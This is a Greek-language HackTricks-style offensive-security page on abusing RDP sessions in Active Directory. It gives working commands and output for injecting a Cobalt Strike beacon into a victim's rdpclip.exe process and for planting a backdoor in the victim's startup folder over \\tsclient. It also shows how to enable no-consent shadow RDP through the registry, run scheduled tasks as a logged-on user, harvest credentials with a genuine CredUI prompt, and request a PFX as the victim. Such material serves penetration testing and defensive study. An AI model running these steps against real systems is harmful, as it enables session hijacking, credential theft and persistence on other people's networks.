# Κατάχρηση συνεδριών RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Αν η **external group** έχει **πρόσβαση μέσω RDP** σε έναν **υπολογιστή** στον τρέχοντα domain, ένας attacker που παραβιάζει αυτόν τον υπολογιστή μπορεί να περιμένει να συνδεθεί ένα μέλος της ομάδας.

Μόλις ο χρήστης συνδεθεί μέσω RDP, ο **attacker μπορεί να μεταβεί στη συνεδρία αυτού του χρήστη** και να καταχραστεί τα δικαιώματά του στον external domain.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Ελέγξτε **άλλους τρόπους υποκλοπής συνεδριών με άλλα εργαλεία** [**σε αυτή τη σελίδα.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Relay αυθεντικοποίησης μεταξύ συνεδριών

Μια **ενεργή συνεδρία κονσόλας ή RDP** που ανήκει σε άλλον χρήστη του domain αποτελεί επίσης ένδειξη, όταν έχετε shell με χαμηλότερα προνόμια στον ίδιο host. Η ενεργοποίηση DCOM μεταξύ συνεδριών μπορεί να κάνει έναν κατάλληλο COM server σε εκείνη την διαδραστική συνεδρία να πραγματοποιήσει αυθεντικοποίηση, ενώ εργαλεία όπως τα RemotePotato0 ή KrbRelay μπορούν να καταγράψουν ή να κάνουν relay αυτή την αυθεντικοποίηση. Ο συνδεδεμένος χρήστης δεν χρειάζεται να είναι διαχειριστής domain: ένα περιορισμένο δικαίωμα στον κατάλογο, όπως η άδεια ανάγνωσης ενός gMSA managed password, μπορεί να αρκεί για ένα επόμενο pivot.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Ξεκινήστε με το ID συνεδρίας και την ταυτότητα που εμφανίζονται μέσω των `query user`, `qwinsta` ή της υπάρχουσας απογραφής συνεδριών του winPEAS. Αντιμετωπίστε τα ως **πιθανούς στόχους**, όχι ως απόδειξη ότι υπάρχει μονοπάτι relay. Η κλάση COM, τα επίπεδα impersonation και authentication, η προσβασιμότητα της συνεδρίας, η δρομολόγηση firewall/OXID, οι προστασίες του πρωτοκόλλου-στόχου και τα πραγματικά δικαιώματα του συνδεδεμένου principal παίζουν ρόλο. Το KrbRelay τεκμηριώνει παραδείγματα cross-session για LDAP, HTTP, SMB και NTLM, αλλά αυτά τα μονοπάτια εξαρτώνται από την έκδοση και τη διαμόρφωση. Το LDAP channel binding αποτελεί επίσης εμπόδιο για relay στην πλευρά του στόχου. Ειδικότερα, το project RemotePotato0 αναφέρει ότι το αρχικό σενάριο exploit RPC-to-LDAP διορθώθηκε το 2022· μην συμπεραίνετε ότι το LDAP relay θα πετύχει μόνο και μόνο επειδή βλέπετε μια συνεδρία.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Αν ένας χρήστης συνδεθεί μέσω **RDP σε ένα μηχάνημα** όπου τον **περιμένει** ένας **attacker**, ο attacker θα μπορεί να **κάνει inject ένα beacon στη συνεδρία RDP του χρήστη** και, αν το **θύμα προσάρτησε τη μονάδα δίσκου του** κατά τη σύνδεση μέσω RDP, ο **attacker θα μπορούσε να έχει πρόσβαση σε αυτήν**.

Σε αυτή την περίπτωση, θα μπορούσατε απλώς να **παραβιάσετε** τον **αρχικό υπολογιστή του θύματος**, γράφοντας ένα **backdoor** στον **φάκελο εκκίνησης**.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Αν είστε **local admin** σε έναν host όπου το θύμα έχει ήδη μια **active RDP session**, ίσως μπορείτε να **δείτε/ελέγξετε αυτή την επιφάνεια εργασίας χωρίς να υποκλέψετε τον κωδικό πρόσβασης ή να κάνετε dump το LSASS**.<sup>[[1]](#references)</sup>

Αυτό εξαρτάται από την πολιτική **Remote Desktop Services shadowing**, η οποία αποθηκεύεται στο:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Ενδιαφέρουσες τιμές:

- `0`: Απενεργοποιημένο
- `1`: `EnableInputNotify` (έλεγχος, απαιτείται έγκριση χρήστη)
- `2`: `EnableInputNoNotify` (έλεγχος, **δεν απαιτείται έγκριση χρήστη**)
- `3`: `EnableNoInputNotify` (μόνο προβολή, απαιτείται έγκριση χρήστη)
- `4`: `EnableNoInputNoNotify` (μόνο προβολή, **δεν απαιτείται έγκριση χρήστη**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Αυτό είναι ιδιαίτερα χρήσιμο όταν ένας προνομιούχος χρήστης που συνδέθηκε μέσω RDP άφησε ανοιχτή μια ξεκλείδωτη επιφάνεια εργασίας, μια συνεδρία KeePass, μια κονσόλα MMC, μια συνεδρία browser ή ένα admin shell.

## Προγραμματισμένες εργασίες ως συνδεδεμένος χρήστης

Αν είστε **local admin** και ο χρήστης-στόχος είναι **αυτήν τη στιγμή συνδεδεμένος**, το Task Scheduler μπορεί να εκκινήσει κώδικα **ως αυτός ο χρήστης χωρίς τον κωδικό πρόσβασής του**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Έτσι, η υπάρχουσα συνεδρία σύνδεσης του θύματος γίνεται primitive εκτέλεσης:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Σημειώσεις:

- Αν ο χρήστης **δεν είναι συνδεδεμένος**, τα Windows συνήθως απαιτούν τον κωδικό πρόσβασης για να δημιουργηθεί μια εργασία που εκτελείται ως αυτός.
- Αν ο χρήστης **είναι συνδεδεμένος**, η εργασία μπορεί να επαναχρησιμοποιήσει το υπάρχον πλαίσιο σύνδεσης.
- Αυτός είναι ένας πρακτικός τρόπος εκτέλεσης ενεργειών GUI ή εκκίνησης binaries μέσα στη συνεδρία του θύματος, χωρίς να αγγίξετε το LSASS.

## Κατάχρηση της προτροπής CredUI από τη συνεδρία του θύματος

Μόλις μπορέσετε να εκτελέσετε κώδικα **μέσα στην αλληλεπιδραστική επιφάνεια εργασίας του θύματος** (για παράδειγμα μέσω **Shadow RDP** ή **προγραμματισμένης εργασίας που εκτελείται ως αυτός ο χρήστης**), μπορείτε να εμφανίσετε μια **πραγματική προτροπή διαπιστευτηρίων των Windows** χρησιμοποιώντας τα CredUI APIs και να συλλέξετε τα διαπιστευτήρια που εισάγει το θύμα.<sup>[[1]](#references)</sup>

Σχετικά APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Συνήθης ροή:

1. Εκκινήστε ένα binary στη συνεδρία του θύματος.
2. Εμφανίστε μια προτροπή ελέγχου ταυτότητας τομέα που ταιριάζει με την τρέχουσα εταιρική ταυτότητα του domain.
3. Αποσυσκευάστε το buffer ελέγχου ταυτότητας που επιστράφηκε.
4. Επικυρώστε τα διαπιστευτήρια που δόθηκαν και, προαιρετικά, συνεχίστε να εμφανίζετε την προτροπή μέχρι να εισαχθούν έγκυρα διαπιστευτήρια.

Αυτό είναι χρήσιμο για **on-host phishing**, επειδή η προτροπή εμφανίζεται από τα τυπικά Windows APIs αντί για μια πλαστή φόρμα HTML.

## Αίτημα PFX στο πλαίσιο του θύματος

Η ίδια primitive **προγραμματισμένης εργασίας ως χρήστης** μπορεί να χρησιμοποιηθεί για αίτημα **πιστοποιητικού/PFX ως ο συνδεδεμένος χρήστης-θύμα**. Αυτό το πιστοποιητικό μπορεί αργότερα να χρησιμοποιηθεί για **έλεγχο ταυτότητας στο AD** ως αυτός ο χρήστης, αποφεύγοντας εντελώς την κλοπή κωδικού πρόσβασης.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Ροή υψηλού επιπέδου:

1. Αποκτήστε **local admin** σε έναν host όπου ο χρήστης-θύμα είναι συνδεδεμένος.
2. Εκτελέστε τη λογική εγγραφής/εξαγωγής ως ο χρήστης-θύμα, χρησιμοποιώντας μια **προγραμματισμένη εργασία**.
3. Εξαγάγετε το PFX που προέκυψε.
4. Χρησιμοποιήστε το PFX για έλεγχο ταυτότητας στο AD μέσω PKINIT / πιστοποιητικού.

Δείτε τις σελίδες AD CS για περαιτέρω κατάχρηση:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Από επίπεδα δίκτυα σε κλειδωμένα domains με μοντέλα διαβάθμισης](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – επιλογές shadow-session του `mstsc`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - PR #465 για το plugin Shadow RDP](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - module schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - PR #908 για αίτημα PFX μέσω προγραμματισμένης εργασίας](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - ενεργοποίηση DCOM μεταξύ συνεδριών και τρέχοντες περιορισμοί](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - παραδείγματα relay μεταξύ συνεδριών και απαιτήσεις CLSID](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - εντολή query session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - χαρακτηριστικό ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - σύνδεση καναλιού LDAP και προστασία από relay](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
